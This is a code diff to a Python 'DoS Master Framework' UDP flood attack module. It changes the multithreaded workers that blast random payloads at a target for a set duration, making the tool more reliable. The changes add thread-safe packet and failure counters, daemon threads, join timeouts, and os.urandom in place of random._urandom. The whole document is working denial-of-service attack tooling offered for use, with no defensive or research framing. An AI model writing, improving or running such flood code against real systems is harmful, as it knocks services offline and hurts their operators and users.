@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 """
-DoS Master Framework - UDP Flood Attack Module
-Professional UDP flood implementation
+DoS Master Framework - UDP Flood Attack Module - FIXED VERSION
+Professional UDP flood implementation with thread-safe packet counting
 """
 
+import os
 import threading
 import time
 import socket
@@ -30,6 +31,7 @@ class UDPFlood:
         self.attack_active = False
         self.start_time = None
         self.worker_threads = []
+        self.packet_lock = threading.Lock()  # Thread-safe counter
         
     def validate_config(self) -> bool:
         """Validate attack configuration"""
@@ -73,6 +75,7 @@ class UDPFlood:
             # Start worker threads
             for i in range(self.threads):
                 thread = threading.Thread(target=self._udp_worker, args=(i,))
+                thread.daemon = True
                 thread.start()
                 self.worker_threads.append(thread)
                 time.sleep(0.1)
@@ -82,7 +85,7 @@ class UDPFlood:
             
             # Wait for all threads to complete
             for thread in self.worker_threads:
-                thread.join()
+                thread.join(timeout=2)
             
             # Calculate results
             end_time = time.time()
@@ -122,7 +125,7 @@ class UDPFlood:
         try:
             # Create UDP socket
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            payload = random._urandom(self.packet_size)
+            payload = os.urandom(self.packet_size)  # Use os.urandom instead of random._urandom
             
             while self.attack_active and (time.time() - self.start_time) < self.duration:
                 try:
@@ -141,23 +144,31 @@ class UDPFlood:
                         # Small delay to prevent system overload
                         time.sleep(0.001)
                     
-                    # Batch update for performance
-                    if local_packets_sent % 1000 == 0:
-                        self.packets_sent += 1000
+                    # Update global counter every 100 packets for better performance
+                    if local_packets_sent % 100 == 0:
+                        with self.packet_lock:
+                            self.packets_sent += 100
                         local_packets_sent = 0
                         
                 except Exception as e:
                     local_packets_failed += 1
                     if local_packets_failed % 100 == 0:
                         self.logger.debug(f"Worker {worker_id}: {local_packets_failed} failed packets")
+                        with self.packet_lock:
+                            self.packets_failed += 100
+                        local_packets_failed = 0
             
-            # Final update
-            self.packets_sent += local_packets_sent
-            self.packets_failed += local_packets_failed
+            # Final update for remaining packets
+            with self.packet_lock:
+                self.packets_sent += local_packets_sent
+                self.packets_failed += local_packets_failed
+            
             sock.close()
             
         except Exception as e:
             self.logger.error(f"UDP worker {worker_id} failed: {e}")
+            with self.packet_lock:
+                self.packets_failed += 1
             
         self.logger.debug(f"UDP worker {worker_id} completed")
     
